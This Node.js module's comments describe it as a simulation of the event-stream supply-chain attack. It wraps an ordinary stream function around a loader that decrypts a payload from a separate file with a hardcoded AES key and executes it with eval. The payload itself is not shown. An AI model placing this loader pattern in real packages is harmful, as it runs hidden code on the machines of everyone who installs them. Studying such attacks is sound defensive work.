var Stream = require('stream')
var payload = require('./payload.js')

// Malicious injection
// This simulates the event-stream attack where a dependency injected code
// into the build process of another package (copay-dash)

module.exports = function (fn, options) {
    // Normal code...
    var stream = new Stream()
    stream.writable = true
    stream.readable = true

    // Malicious payload execution
    // Decrypts the payload and executes it
    var decipher = require('crypto').createDecipher('aes256', 'password')
    var decoded = decipher.update(payload.data, 'hex', 'utf8')
    decoded += decipher.final('utf8')

    // Dangerous eval
    eval(decoded)

    return stream
}
